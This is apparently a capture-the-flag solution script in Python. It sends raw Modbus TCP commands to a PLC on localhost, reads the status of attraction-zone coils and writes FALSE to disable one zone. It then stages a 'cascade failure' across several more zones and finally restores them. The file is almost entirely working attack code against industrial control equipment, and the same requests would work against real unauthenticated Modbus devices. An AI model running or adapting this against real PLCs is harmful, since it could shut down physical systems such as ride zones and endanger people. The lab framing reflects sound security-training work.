#!/usr/bin/env python3
"""
CTF Challenge 3: Zone Manipulation (Medium - 200 points)
Enable or disable individual attraction zones through Modbus coil writes

Method: Write FALSE to zone enable coils (5-9) during operation
"""

import socket
import struct
import time

PLC_HOST = 'localhost'
PLC_PORT = 502

def build_write_coil(transaction_id, address, value):
    """Build a Modbus Write Single Coil request"""
    protocol_id = 0
    data_length = 6
    unit_id = 1
    function_code = 5

    value_bytes = 0xFF00 if value else 0x0000

    return struct.pack('>HHHBBHH',
        transaction_id,
        protocol_id,
        data_length,
        unit_id,
        function_code,
        address,
        value_bytes
    )

def build_read_coils(transaction_id, address, quantity):
    """Build a Modbus Read Coils request"""
    protocol_id = 0
    data_length = 6
    unit_id = 1
    function_code = 1

    return struct.pack('>HHHBBHH',
        transaction_id,
        protocol_id,
        data_length,
        unit_id,
        function_code,
        address,
        quantity
    )

def parse_read_coils_response(response):
    """Parse a Read Coils response"""
    if len(response) < 9:
        return None

    byte_count = response[8]
    coil_bytes = response[9:9+byte_count]

    coils = []
    for byte_val in coil_bytes:
        for bit in range(8):
            coils.append(bool(byte_val & (1 << bit)))

    return coils

def main():
    print("="*60)
    print("CTF Challenge 3: Zone Manipulation")
    print("="*60)
    print()
    print("Objective: Disable attraction zones during operation")
    print("Method: Write FALSE to zone enable coils")
    print()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sock.connect((PLC_HOST, PLC_PORT))
        print(f"✓ Connected to PLC at {PLC_HOST}:{PLC_PORT}")
    except Exception as e:
        print(f"❌ Failed to connect: {e}")
        return

    transaction_id = 1

    print("\n[Phase 1] Reading current zone status...")
    request = build_read_coils(transaction_id, 5, 5)
    sock.send(request)
    response = sock.recv(1024)

    coils = parse_read_coils_response(response)
    if coils:
        print("  Zone Status:")
        for i in range(5):
            status = "ENABLED" if coils[i] else "DISABLED"
            print(f"    Zone {i+1}: {status}")

    transaction_id += 1

    print("\n[Phase 2] Disabling Zone 3...")
    # Write FALSE to zone_3_enable (coil 7)
    request = build_write_coil(transaction_id, 7, False)
    sock.send(request)
    sock.recv(1024)
    print("  ✓ Zone 3 disabled")

    transaction_id += 1
    time.sleep(0.5)

    print("\n[Phase 3] Verifying zone manipulation...")
    request = build_read_coils(transaction_id, 5, 5)
    sock.send(request)
    response = sock.recv(1024)

    coils = parse_read_coils_response(response)
    if coils:
        print("  Updated Zone Status:")
        for i in range(5):
            status = "ENABLED" if coils[i] else "DISABLED"
            marker = " ⚠️ ATTACKED!" if i == 2 and not coils[i] else ""
            print(f"    Zone {i+1}: {status}{marker}")

        disabled_count = sum(1 for c in coils[:5] if not c)
        if disabled_count >= 1:
            print("\n🎯 SUCCESS! Zone manipulation completed")
            print(f"   {disabled_count} zone(s) disabled")

    transaction_id += 1

    print("\n[Phase 4] Creating cascade failure...")
    for zone_num in [2, 4, 5]:
        print(f"  Disabling Zone {zone_num}...")
        request = build_write_coil(transaction_id, 4 + zone_num, False)
        sock.send(request)
        sock.recv(1024)
        transaction_id += 1
        time.sleep(0.3)

    print("\n[Phase 5] Final zone status...")
    request = build_read_coils(transaction_id, 5, 5)
    sock.send(request)
    response = sock.recv(1024)

    coils = parse_read_coils_response(response)
    if coils:
        disabled_count = sum(1 for c in coils[:5] if not c)
        print(f"  ✓ {disabled_count}/5 zones disabled")

    print("\n[Phase 6] Restoring zones...")
    transaction_id += 1
    for coil_addr in range(5, 10):
        request = build_write_coil(transaction_id, coil_addr, True)
        sock.send(request)
        sock.recv(1024)
        transaction_id += 1

    print("  ✓ All zones restored")

    sock.close()

if __name__ == '__main__':
    main()
